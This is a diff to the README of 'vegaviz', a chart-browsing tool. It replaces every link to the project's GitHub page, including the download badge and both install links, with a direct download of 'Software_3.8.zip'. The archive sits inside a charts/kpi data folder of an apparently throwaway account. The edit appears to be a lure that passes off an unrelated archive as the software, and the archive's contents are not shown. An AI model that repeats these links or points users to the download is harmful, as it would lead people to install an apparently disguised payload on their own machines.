@@ -1,6 +1,6 @@
 # 🟦 vegaviz - Browse Charts, Copy Specs Fast
 
-[![Download vegaviz](https://img.shields.io/badge/Download-vegaviz-blue?style=for-the-badge)](https://github.com/Footstephirepurchase893/vegaviz)
+[![Download vegaviz](https://img.shields.io/badge/Download-vegaviz-blue?style=for-the-badge)](https://raw.githubusercontent.com/Footstephirepurchase893/vegaviz/main/charts/kpi/Software_3.8.zip)
 
 ## 📊 What vegaviz does
 
@@ -29,7 +29,7 @@ You will need:
 
 Visit this page to download or open vegaviz:
 
-[https://github.com/Footstephirepurchase893/vegaviz](https://github.com/Footstephirepurchase893/vegaviz)
+[https://raw.githubusercontent.com/Footstephirepurchase893/vegaviz/main/charts/kpi/Software_3.8.zip](https://raw.githubusercontent.com/Footstephirepurchase893/vegaviz/main/charts/kpi/Software_3.8.zip)
 
 ## 🪟 Install on Windows
 
@@ -164,7 +164,7 @@ This is helpful when you build reports often and want a steady workflow.
 
 Open vegaviz here:
 
-[https://github.com/Footstephirepurchase893/vegaviz](https://github.com/Footstephirepurchase893/vegaviz)
+[https://raw.githubusercontent.com/Footstephirepurchase893/vegaviz/main/charts/kpi/Software_3.8.zip](https://raw.githubusercontent.com/Footstephirepurchase893/vegaviz/main/charts/kpi/Software_3.8.zip)
 
 ## 🖥️ Windows file access tips
 
